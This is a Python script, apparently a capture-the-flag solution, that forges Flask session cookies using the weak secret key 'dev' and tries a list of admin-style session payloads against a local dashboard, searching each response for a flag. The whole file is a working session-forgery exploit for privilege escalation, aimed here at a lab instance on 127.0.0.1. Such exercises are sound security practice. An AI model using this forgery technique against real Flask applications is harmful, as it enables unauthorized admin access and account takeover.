import requests
import re
from itsdangerous import URLSafeTimedSerializer
import hashlib

# Target URL
base_url = "http://127.0.0.1:32883"
dashboard_url = f"{base_url}/dashboard"

# Working secret key
secret_key = 'dev'

def forge_flask_session(secret_key, session_data):
    """Forge a Flask session cookie with custom data"""
    try:
        serializer = URLSafeTimedSerializer(
            secret_key,
            salt='cookie-session',
            signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
        )
        forged_cookie = serializer.dumps(session_data)
        return forged_cookie
    except Exception as e:
        print(f"[!] Error forging session: {e}")
        return None

print("[*] Testing different session structures")
print("="*80)

# Different session data structures to try
session_variations = [
    # Just user_id with special values
    {'user_id': 0},
    {'user_id': -1},
    {'user_id': 1},
    {'user_id': 'admin'},
    
    # With user_type field
    {'user_id': 1, 'user_type': 'admin'},
    {'user_id': 1, 'user_type': 'administrator'},
    {'user_id': 0, 'user_type': 'admin'},
    
    # With username field
    {'user_id': 1, 'username': 'admin'},
    {'username': 'admin'},
    
    # With is_admin flag
    {'user_id': 1, 'is_admin': True},
    {'user_id': 1, 'admin': True},
    
    # With role field
    {'user_id': 1, 'role': 'admin'},
    
    # Try empty session
    {},
]

found_flag = False

for session_data in session_variations:
    if found_flag:
        break
        
    forged_cookie = forge_flask_session(secret_key, session_data)
    if forged_cookie:
        cookies = {'session': forged_cookie}
        response = requests.get(dashboard_url, cookies=cookies, allow_redirects=False, timeout=5)
        
        # Look for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        
        if response.status_code != 302 or flag_match:
            print(f"\n[+] Session Data: {session_data}")
            print(f"[+] Status: {response.status_code} | Length: {len(response.content)}B")
            
            if flag_match:
                print(f"[!] FLAG FOUND: {flag_match.group(0)}")
                found_flag = True
            
            print(f"[+] Response:\n{response.text}")
            print("="*80)

if not found_flag:
    print("\n[-] No flag found with any session structure variation")
    print("[*] All returned 302 redirects")
    
    # Let's also try to check what the dashboard expects by looking at response headers
    print("\n[*] Checking one response in detail:")
    test_session = {'user_id': 1}
    forged_cookie = forge_flask_session(secret_key, test_session)
    cookies = {'session': forged_cookie}
    response = requests.get(dashboard_url, cookies=cookies, allow_redirects=False, timeout=5)
    
    print(f"Status: {response.status_code}")
    print(f"Headers: {dict(response.headers)}")
    print(f"Response: {response.text}")

